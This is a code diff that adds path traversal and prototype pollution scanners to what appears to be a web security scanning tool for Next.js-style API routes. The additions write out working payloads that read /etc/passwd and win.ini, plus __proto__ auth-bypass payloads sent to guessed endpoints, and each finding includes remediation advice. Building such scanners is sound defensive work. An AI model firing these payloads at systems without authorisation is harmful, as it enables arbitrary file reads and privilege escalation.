@@ -575,11 +575,457 @@ function checkReactDoSVersion(version, cve) {
   return false;
 }
 
+/**
+ * Path Traversal Scanner for File-Serving API Routes
+ * Detects insecure path.join() usage with user input allowing arbitrary file read
+ */
+export async function pathTraversalScanner(context) {
+  const { framework, url, settings, capturedRequests } = context;
+  const results = [];
+
+  // Only run in active mode - this requires probing
+  if (settings?.scanMode !== 'active') {
+    return results;
+  }
+
+  // Common API route patterns that might serve files
+  const fileServingEndpoints = [
+    '/api/image',
+    '/api/file',
+    '/api/download',
+    '/api/asset',
+    '/api/media',
+    '/api/static',
+    '/api/serve',
+    '/api/get-file',
+    '/api/fetch-file',
+    '/api/read',
+    '/api/load'
+  ];
+
+  // Also check captured requests for endpoints with path/file parameters
+  const discoveredEndpoints = discoverFileEndpoints(capturedRequests || []);
+  const allEndpoints = [...new Set([...fileServingEndpoints, ...discoveredEndpoints])];
+
+  // Path traversal payloads
+  const traversalPayloads = [
+    { param: 'path', value: '../../../../etc/passwd' },
+    { param: 'file', value: '../../../../etc/passwd' },
+    { param: 'filename', value: '../../../../etc/passwd' },
+    { param: 'src', value: '../../../../etc/passwd' },
+    { param: 'path', value: '....//....//....//....//etc/passwd' },
+    { param: 'path', value: '..%2F..%2F..%2F..%2Fetc%2Fpasswd' },
+    { param: 'path', value: '..\\..\\..\\..\\etc\\passwd' }
+  ];
+
+  // Indicators of successful /etc/passwd read
+  const passwdIndicators = ['root:', 'nobody:', 'daemon:', '/bin/bash', '/bin/sh', '/nix/store', ':x:'];
+
+  for (const endpoint of allEndpoints) {
+    for (const payload of traversalPayloads) {
+      try {
+        const testUrl = new URL(endpoint, url);
+        testUrl.searchParams.set(payload.param, payload.value);
+
+        const response = await fetch(testUrl.toString(), {
+          method: 'GET',
+          headers: {
+            'X-BlueDragon-Probe': generateSafeId()
+          },
+          signal: AbortSignal.timeout(5000)
+        });
+
+        if (!response.ok) continue;
+
+        const text = await response.text();
+        const matchedIndicators = passwdIndicators.filter(ind => text.includes(ind));
+
+        if (matchedIndicators.length >= 2) {
+          // High confidence - multiple passwd indicators found
+          results.push({
+            type: 'PATH_TRAVERSAL',
+            name: 'Path Traversal - Arbitrary File Read',
+            severity: SEVERITY.CRITICAL,
+            cvss: 7.5,
+            description: `Path traversal vulnerability allows reading arbitrary files. Successfully read /etc/passwd via ${endpoint}`,
+            url: testUrl.toString(),
+            framework: framework?.framework,
+            exploitable: true,
+            endpoint,
+            payload: `${payload.param}=${payload.value}`,
+            evidence: text.substring(0, 500),
+            matchedIndicators,
+            remediation: 'Sanitize path input: use path.basename(), validate against allowlist, or use path.resolve() with directory containment check',
+            references: [
+              'https://owasp.org/www-community/attacks/Path_Traversal'
+            ]
+          });
+
+          // Found vulnerability on this endpoint, skip other payloads
+          break;
+        }
+      } catch (e) {
+        // Endpoint doesn't exist or timed out
+      }
+    }
+  }
+
+  // Also try to detect Windows systems
+  if (results.length === 0) {
+    for (const endpoint of allEndpoints.slice(0, 3)) {
+      try {
+        const testUrl = new URL(endpoint, url);
+        testUrl.searchParams.set('path', '..\\..\\..\\..\\windows\\win.ini');
+
+        const response = await fetch(testUrl.toString(), {
+          method: 'GET',
+          signal: AbortSignal.timeout(5000)
+        });
+
+        if (!response.ok) continue;
+
+        const text = await response.text();
+        if (text.includes('[fonts]') || text.includes('[extensions]')) {
+          results.push({
+            type: 'PATH_TRAVERSAL',
+            name: 'Path Traversal - Arbitrary File Read (Windows)',
+            severity: SEVERITY.CRITICAL,
+            cvss: 7.5,
+            description: `Path traversal vulnerability on Windows server. Successfully read win.ini via ${endpoint}`,
+            url: testUrl.toString(),
+            framework: framework?.framework,
+            exploitable: true,
+            endpoint,
+            payload: 'path=..\\..\\..\\..\\windows\\win.ini',
+            evidence: text.substring(0, 500),
+            remediation: 'Sanitize path input: use path.basename(), validate against allowlist, or use path.resolve() with directory containment check'
+          });
+          break;
+        }
+      } catch (e) {
+        // Continue
+      }
+    }
+  }
+
+  return results;
+}
+
+/**
+ * Discover file-serving endpoints from captured requests
+ */
+function discoverFileEndpoints(requests) {
+  const endpoints = [];
+  const fileParams = ['path', 'file', 'filename', 'src', 'image', 'asset', 'download'];
+
+  for (const req of requests) {
+    try {
+      const reqUrl = new URL(req.url);
+
+      // Check if any file-related params exist
+      for (const param of fileParams) {
+        if (reqUrl.searchParams.has(param)) {
+          // Extract base endpoint without query params
+          endpoints.push(reqUrl.pathname);
+          break;
+        }
+      }
+
+      // Check for /api/ routes that might serve files
+      if (reqUrl.pathname.includes('/api/') &&
+          (reqUrl.pathname.includes('image') ||
+           reqUrl.pathname.includes('file') ||
+           reqUrl.pathname.includes('download') ||
+           reqUrl.pathname.includes('asset'))) {
+        endpoints.push(reqUrl.pathname);
+      }
+    } catch (e) {
+      // Invalid URL
+    }
+  }
+
+  return [...new Set(endpoints)];
+}
+
+/**
+ * Server Action Prototype Pollution Scanner
+ * Detects auth bypass via __proto__ injection in Object.assign/spread patterns
+ */
+export async function serverActionPrototypePollutionScanner(context) {
+  const { framework, url, settings, capturedRequests } = context;
+  const results = [];
+
+  // Only run in active mode
+  if (settings?.scanMode !== 'active') {
+    return results;
+  }
+
+  // Common API route patterns for auth/user operations
+  const authEndpoints = [
+    '/api/test-action',
+    '/api/auth',
+    '/api/login',
+    '/api/user',
+    '/api/admin',
+    '/api/profile',
+    '/api/account',
+    '/api/settings',
+    '/api/permissions',
+    '/api/roles'
+  ];
+
+  // Discover additional JSON endpoints from captured requests
+  const discoveredEndpoints = discoverJsonEndpoints(capturedRequests || []);
+  const allEndpoints = [...new Set([...authEndpoints, ...discoveredEndpoints])];
+
+  // Prototype pollution payloads targeting auth bypass
+  const pollutionPayloads = [
+    {
+      name: '__proto__ isAdmin bypass',
+      payload: { "__proto__": { "isAdmin": true }, "username": "test" }
+    },
+    {
+      name: '__proto__ role escalation',
+      payload: { "__proto__": { "role": "admin" }, "username": "test" }
+    },
+    {
+      name: '__proto__ authenticated bypass',
+      payload: { "__proto__": { "authenticated": true, "isAuthenticated": true }, "username": "test" }
+    },
+    {
+      name: 'constructor.prototype pollution',
+      payload: { "constructor": { "prototype": { "isAdmin": true } }, "username": "test" }
+    },
+    {
+      name: '__proto__ permissions array',
+      payload: { "__proto__": { "permissions": ["admin", "write", "delete"] }, "username": "test" }
+    }
+  ];
+
+  // Indicators of successful auth bypass
+  const bypassIndicators = [
+    'admin', 'secret', 'granted', 'authorized', 'success',
+    'private', 'internal', 'confidential', 'API_KEY', 'SECRET',
+    'users', 'database', 'credentials', 'token', 'jwt'
+  ];
+
+  for (const endpoint of allEndpoints) {
+    // First, establish baseline with normal request
+    let baselineResponse = null;
+    let baselineBody = '';
+
+    try {
+      const baselineUrl = new URL(endpoint, url);
+      baselineResponse = await fetch(baselineUrl.toString(), {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-BlueDragon-Probe': generateSafeId()
+        },
+        body: JSON.stringify({ username: 'test' }),
+        signal: AbortSignal.timeout(5000)
+      });
+      baselineBody = await baselineResponse.text();
+    } catch (e) {
+      // Endpoint doesn't exist or doesn't accept POST
+      continue;
+    }
+
+    // Now test with pollution payloads
+    for (const { name, payload } of pollutionPayloads) {
+      try {
+        const testUrl = new URL(endpoint, url);
+        const probeId = generateSafeId();
+
+        const response = await fetch(testUrl.toString(), {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-BlueDragon-Probe': probeId
+          },
+          body: JSON.stringify(payload),
+          signal: AbortSignal.timeout(5000)
+        });
+
+        const body = await response.text();
+
+        // Check for auth bypass indicators
+        const foundIndicators = bypassIndicators.filter(ind =>
+          body.toLowerCase().includes(ind.toLowerCase()) &&
+          !baselineBody.toLowerCase().includes(ind.toLowerCase())
+        );
+
+        // Check for significant response differences
+        const statusChanged = baselineResponse && response.status !== baselineResponse.status;
+        const responseLengthDiff = Math.abs(body.length - baselineBody.length);
+        const significantLengthChange = responseLengthDiff > 100;
+
+        // High confidence: found sensitive data not in baseline
+        if (foundIndicators.length >= 2 || (foundIndicators.length >= 1 && significantLengthChange)) {
+          results.push({
+            type: 'PROTOTYPE_POLLUTION',
+            name: 'Server Action Prototype Pollution - Auth Bypass',
+            severity: SEVERITY.CRITICAL,
+            cvss: 8.1,
+            description: `Prototype pollution via ${name} bypasses authorization. Sensitive data exposed.`,
+            url: testUrl.toString(),
+            framework: framework?.framework,
+            exploitable: true,
+            endpoint,
+            payload: JSON.stringify(payload),
+            evidence: body.substring(0, 500),
+            foundIndicators,
+            statusChange: statusChanged ? { baseline: baselineResponse?.status, polluted: response.status } : null,
+            remediation: 'Use Object.create(null), filter __proto__/constructor properties, or use hasOwnProperty for auth checks',
+            references: [
+              'https://portswigger.net/web-security/prototype-pollution'
+            ]
+          });
+
+          // Found vulnerability, skip other payloads for this endpoint
+          break;
+        }
+
+        // Medium confidence: status code changed from denied to success
+        if (statusChanged &&
+            (baselineResponse.status === 401 || baselineResponse.status === 403) &&
+            (response.status === 200)) {
+          results.push({
+            type: 'PROTOTYPE_POLLUTION',
+            name: 'Server Action Prototype Pollution - Potential Auth Bypass',
+            severity: SEVERITY.HIGH,
+            cvss: 7.5,
+            description: `Prototype pollution via ${name} changed response status from ${baselineResponse.status} to ${response.status}`,
+            url: testUrl.toString(),
+            framework: framework?.framework,
+            exploitable: true,
+            endpoint,
+            payload: JSON.stringify(payload),
+            statusChange: { baseline: baselineResponse.status, polluted: response.status },
+            note: 'Status code changed from denied to success - verify manually',
+            remediation: 'Use Object.create(null), filter __proto__/constructor properties'
+          });
+          break;
+        }
+
+        // Low confidence: server error on pollution attempt (may indicate processing)
+        if (response.status === 500 && baselineResponse?.status !== 500) {
+          results.push({
+            type: 'PROTOTYPE_POLLUTION',
+            name: 'Server Action Prototype Pollution - Server Error',
+            severity: SEVERITY.MEDIUM,
+            description: `Server error when sending ${name} payload. May indicate vulnerability.`,
+            url: testUrl.toString(),
+            framework: framework?.framework,
+            endpoint,
+            payload: JSON.stringify(payload),
+            responseStatus: response.status,
+            note: 'Server crashed or threw error on prototype pollution attempt - investigate manually'
+          });
+        }
+      } catch (e) {
+        // Request failed
+      }
+    }
+  }
+
+  // Also test Server Actions directly if we found any
+  const serverActions = findServerActionEndpoints(capturedRequests || []);
+  for (const action of serverActions.slice(0, 5)) {
+    for (const { name, payload } of pollutionPayloads.slice(0, 2)) {
+      try {
+        const probeId = generateSafeId();
+
+        const response = await fetch(action.url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'text/plain;charset=UTF-8',
+            'Next-Action': action.actionId || '',
+            'X-BlueDragon-Probe': probeId
+          },
+          body: JSON.stringify([payload]),
+          signal: AbortSignal.timeout(5000)
+        });
+
+        const body = await response.text();
+        const foundIndicators = bypassIndicators.filter(ind =>
+          body.toLowerCase().includes(ind.toLowerCase())
+        );
+
+        if (foundIndicators.length >= 1) {
+          results.push({
+            type: 'PROTOTYPE_POLLUTION',
+            name: 'Server Action Prototype Pollution - Direct Action',
+            severity: SEVERITY.HIGH,
+            cvss: 7.5,
+            description: `Prototype pollution in Server Action via ${name}`,
+            url: action.url,
+            framework: framework?.framework,
+            exploitable: true,
+            actionId: action.actionId,
+            payload: JSON.stringify(payload),
+            foundIndicators,
+            note: 'Direct Server Action injection successful',
+            remediation: 'Sanitize input in Server Actions before using Object.assign or spread operator'
+          });
+          break;
+        }
+      } catch (e) {
+        // Request failed
+      }
+    }
+  }
+
+  return results;
+}
+
+/**
+ * Discover JSON API endpoints from captured requests
+ */
+function discoverJsonEndpoints(requests) {
+  const endpoints = [];
+
+  for (const req of requests) {
+    try {
+      const contentType = req.headers?.['content-type'] || '';
+      if (contentType.includes('application/json') &&
+          (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH')) {
+        const reqUrl = new URL(req.url);
+        endpoints.push(reqUrl.pathname);
+      }
+    } catch (e) {
+      // Invalid URL
+    }
+  }
+
+  return [...new Set(endpoints)];
+}
+
+/**
+ * Find Server Action endpoints from captured requests
+ */
+function findServerActionEndpoints(requests) {
+  const actions = [];
+
+  for (const req of requests) {
+    if (req.headers?.['next-action']) {
+      actions.push({
+        url: req.url,
+        actionId: req.headers['next-action']
+      });
+    }
+  }
+
+  return actions;
+}
+
 export default {
   react2shellScanner,
   serverActionSSRFScanner,
   imageDoSScanner,
   middlewareBypassScanner,
   sourceCodeExposureScanner,
-  reactDoSScanner
+  reactDoSScanner,
+  pathTraversalScanner,
+  serverActionPrototypePollutionScanner
 };
